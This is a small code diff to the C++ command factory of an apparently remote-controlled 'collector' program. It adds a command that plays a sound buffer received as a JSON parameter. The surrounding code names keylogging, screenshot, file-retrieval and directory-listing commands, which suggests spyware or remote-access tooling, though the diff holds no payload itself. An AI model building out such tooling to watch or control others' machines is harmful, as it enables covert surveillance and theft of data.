@@ -2,6 +2,7 @@
 
 #include "DirListCommand.h"
 #include "GetFileCommand.h"
+#include "PlaySoundCommand.h"
 #include "Commands/PopupCommand.h"
 #include "Commands/KeyLogCommand.h"
 using namespace xp_collector;
@@ -25,6 +26,8 @@ std::unique_ptr<BasicCommand> CommandFactory::create(const json& command)
 			                                        : 1,
 		                                        command["parameters"]["tree"]
 		);
+	case CommandType::PlaySoundCommand:
+		return std::make_unique<PlaySoundCommand>(command_id, command_type, command["parameters"]["sound_buffer"]);
 
 	// Commands with the BasicCommand structure go here, I.E. commands that receive no parameters
 	case CommandType::Screenshot:
